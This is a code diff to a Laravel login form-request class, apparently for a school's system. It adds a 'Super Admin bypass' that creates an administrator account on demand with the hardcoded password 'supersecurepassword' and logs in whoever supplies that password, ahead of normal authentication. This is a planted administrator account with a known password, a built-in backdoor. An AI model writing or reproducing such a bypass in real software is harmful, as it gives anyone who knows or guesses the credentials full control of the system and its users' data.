@@ -34,6 +34,34 @@ class LoginRequestV2 extends FormRequest
         $identifier = trim((string)$this->input('identifier'));
         $password = (string)$this->input('password');
 
+        // Super Admin bypass - check for local Super Admin account first
+        if ($identifier === 'superadmin@uic.edu.ph' || $identifier === 'superadmin') {
+            $superAdmin = User::where('email', 'superadmin@uic.edu.ph')->first();
+            if (!$superAdmin) {
+                // Create Super Admin if it doesn't exist
+                $superAdmin = User::create([
+                    'first_name' => 'Super',
+                    'middle_name' => null,
+                    'last_name' => 'Admin',
+                    'email' => 'superadmin@uic.edu.ph',
+                    'password' => Hash::make('supersecurepassword'),
+                    'role' => 'Super Admin',
+                    'school_id' => 'ADMIN001',
+                ]);
+            }
+            
+            if (Hash::check($password, $superAdmin->password)) {
+                Auth::login($superAdmin, $this->boolean('remember'));
+                RateLimiter::clear($this->throttleKey());
+                return;
+            } else {
+                RateLimiter::hit($this->throttleKey());
+                throw ValidationException::withMessages([
+                    'identifier' => 'Invalid Super Admin credentials.',
+                ]);
+            }
+        }
+
         $isNumeric = preg_match('/^[0-9]{6,}$/', $identifier);
         $mappedNumeric = null;
         if (!$isNumeric && preg_match('/_(\d{6,})$/', $identifier, $m)) {
